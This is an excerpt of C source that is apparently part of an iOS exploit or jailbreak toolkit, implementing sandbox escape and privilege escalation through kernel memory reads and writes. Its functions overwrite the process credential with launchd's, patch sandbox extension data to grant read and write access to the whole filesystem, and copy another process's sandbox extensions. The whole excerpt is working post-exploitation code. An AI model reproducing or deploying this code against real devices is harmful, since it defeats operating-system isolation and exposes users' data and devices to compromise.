...
int sbx_escape(uint64_t self_proc) {
    ...
    const char *test_paths[] = {
        "/var/mobile/.rooootwashere",
        NULL,
        NULL,
    };
    char tmp_test[PATH_MAX];
    const char *tmpdir = getenv("TMPDIR");
    if (tmpdir && tmpdir[0]) {
        snprintf(tmp_test, sizeof(tmp_test), "%s/.dsploit_sbx_test", tmpdir);
        test_paths[1] = tmp_test;
    }

    int fd_w = -1;
    const char *used = NULL;
    for (int i = 0; i < 3; i++) {
        if (!test_paths[i]) continue;
        fd_w = open(test_paths[i], O_WRONLY | O_CREAT | O_TRUNC, 0644);
        if (fd_w >= 0) {
            used = test_paths[i];
            close(fd_w);
            unlink(test_paths[i]);
    ...
    if (fd_w >= 0) {
        sbx_log("escaped! (verify: %s)", used ? used : "ok");
        return 0;
    }

    /* iOS 18.2: kernel patches often apply but /var/mobile open still EPERM from app context */
    if (patched > 0 && classed > 0) {
        sbx_log("verify open failed (errno=%d) but %d ext patched / %d classes — continuing",
                errno, patched, classed);
        return 0;
    }
...
int sbx_elevate(void) {
    ...
    uint64_t ourucredraw = ds_kread64(self_proc + OFF_PROC_PROC_RO);
    uint64_t ourprocro = S(ourucredraw);
    uint64_t ourucred = S(ds_kread64(ourprocro + OFF_PROC_RO_UCRED));
    sbx_log("ourprocro: 0x%llx ourucred: 0x%llx", ourprocro, ourucred);
    
    // Write launchd's ucred to our proc_ro's ucred slot
    ds_kwrite64(ourprocro + OFF_PROC_RO_UCRED, launchducred);
...
// MARK: - Alternative Sandbox Escape: Extension Data Patching
// Based on cyanide-ios approach by CrazyMind90/zeroxjf
// Patches sandbox extension data to grant full filesystem R/W

#include <sys/stat.h>
extern int sandbox_check(pid_t pid, const char *operation, int type, ...);

int sbx_patch_extension(uint64_t self_proc) {
    sbx_log("(sbx) patching sandbox extension data...");
    
    uint64_t proc_ro = S(ds_kread64(self_proc + OFF_PROC_PROC_RO));
    if (!K(proc_ro)) { sbx_log("(sbx) proc_ro is NULL/invalid"); return -1; }
    
    uint64_t ucred = S(ds_kread64(proc_ro + OFF_PROC_RO_UCRED));
    if (!K(ucred)) { sbx_log("(sbx) ucred is NULL/invalid"); return -1; }
    
    uint64_t label = S(ds_kread64(ucred + OFF_UCRED_CR_LABEL));
    if (!K(label)) { sbx_log("(sbx) label is NULL/invalid"); return -1; }
    
    uint64_t sbx = S(ds_kread64(label + OFF_LABEL_SANDBOX));
    if (!K(sbx)) { sbx_log("(sbx) sandbox is NULL/invalid"); return -1; }
    
    uint64_t ext_set = S(ds_kread64(sbx + OFF_SANDBOX_EXT_SET));
    if (!K(ext_set)) { sbx_log("(sbx) ext_set is NULL/invalid"); return -1; }
    
    // Walk extension buckets to find container extension
    for (int i = 0; i < 9; i++) {
        uint64_t ext_class_node = ds_kread64(ext_set + (i * 8));
        if (!ext_class_node) continue;
        
        // Read class name
        uint64_t class_name_ptr = ds_kread64(ext_class_node + 0x10);
        if (!class_name_ptr) continue;
        
        char name[256] = {0};
        ds_kreadbuf(class_name_ptr, name, 255);
        
        if (strstr(name, "com.apple.sandbox.container") == NULL) continue;
        
        // Found container extension — get first extension in list
        uint64_t ext = ds_kread64(ext_class_node + 0x08);
        if (!ext) continue;
        
        // Read extension data pointer
        uint64_t data_ptr = ds_kread64(ext + OFF_EXT_DATA);
        if (!data_ptr) continue;
        
        // Overwrite path with "/" (root access)
        uint8_t root_path[] = { '/', '\0' };
        ds_kwritebuf(data_ptr, root_path, 2);
        
        // Overwrite class name to "com.apple.app-sandbox.read-write"
        const char *new_class = "com.apple.app-sandbox.read-write";
        ds_kwritebuf(data_ptr + 2, (void*)new_class, strlen(new_class) + 1);
        
        // Update class_name pointer to point to our new class string
        ds_kwrite64(ext_class_node + 0x10, data_ptr + 2);
        
        // Set path_len = 1 (just "/")
        ds_kwrite64(ext + OFF_EXT_DATALEN, 1);
        
        // Mark as consumed and issued
        ds_kwrite8(ext + 0x50, 1);  // consumed
        ds_kwrite8(ext + 0x51, 0x02);  // SC_ISSUED
        
        // Set st_dev and st_ino for "/"
        struct stat st;
        stat("/", &st);
        ds_kwrite32(ext + 0x54, (uint32_t)st.st_dev);
        ds_kwrite64(ext + 0x58, (uint64_t)st.st_ino);
        
        // Move to bucket 0 (file extensions)
        ds_kwrite64(ext_set, ext_class_node);
        
        sbx_log("(sbx) extension patched! testing...");
        
        // Verify
        pid_t pid = getpid();
        int r = sandbox_check(pid, "file-read-data", 2 | 0x40000, "/private/var");
        int w = sandbox_check(pid, "file-write-data", 2 | 0x40000, "/private/var");
        
        if (r == 0 && w == 0) {
            sbx_log("(sbx) extension patch SUCCESS! full r/w access");
            return 0;
        } else {
            sbx_log("(sbx) extension patch applied but verify failed (r=%d w=%d)", r, w);
            return -1;
        }
    }
    
    sbx_log("(sbx) no container extension found to patch");
    return -1;
}

// Borrow sandbox extensions from another process (e.g. sysdiagnosed)
int sbx_borrow_extensions(const char* process) {
    if (!process) return -1;
    
    uint64_t victim_proc = procbyname(process);
    if (!victim_proc) {
        sbx_log("(sbx) process not found: %s", process);
        return -1;
    }
    
    // Get our sandbox extension set (with proper PAC stripping)
    uint64_t self_proc = ds_get_our_proc();
    if (!self_proc) { sbx_log("(sbx) our proc not found"); return -1; }
    uint64_t self_proc_ro = S(ds_kread64(self_proc + OFF_PROC_PROC_RO));
    uint64_t self_ucred = S(ds_kread64(self_proc_ro + OFF_PROC_RO_UCRED));
    uint64_t self_label = S(ds_kread64(self_ucred + OFF_UCRED_CR_LABEL));
    uint64_t self_sbx = S(ds_kread64(self_label + OFF_LABEL_SANDBOX));
    uint64_t self_ext_set = S(ds_kread64(self_sbx + OFF_SANDBOX_EXT_SET));
    
    // Get victim's sandbox extension set (with proper PAC stripping)
    uint64_t victim_proc_ro = S(ds_kread64(victim_proc + OFF_PROC_PROC_RO));
    uint64_t victim_ucred = S(ds_kread64(victim_proc_ro + OFF_PROC_RO_UCRED));
    uint64_t victim_label = S(ds_kread64(victim_ucred + OFF_UCRED_CR_LABEL));
    uint64_t victim_sbx = S(ds_kread64(victim_label + OFF_LABEL_SANDBOX));
    uint64_t victim_ext_set = S(ds_kread64(victim_sbx + OFF_SANDBOX_EXT_SET));
    
    if (!K(self_ext_set) || !K(victim_ext_set)) {
        sbx_log("(sbx) ext_set invalid: self=0x%llx victim=0x%llx", self_ext_set, victim_ext_set);
        return -1;
    }
    
    // Copy all 9 extension buckets from victim to self
    for (int i = 0; i < 9; i++) {
        uint64_t victim_bucket = ds_kread64(victim_ext_set + (i * 8));
        ds_kwrite64(self_ext_set + (i * 8), victim_bucket);
    }
    
    sbx_log("(sbx) borrowed extensions from %s", process);
    return 0;
}
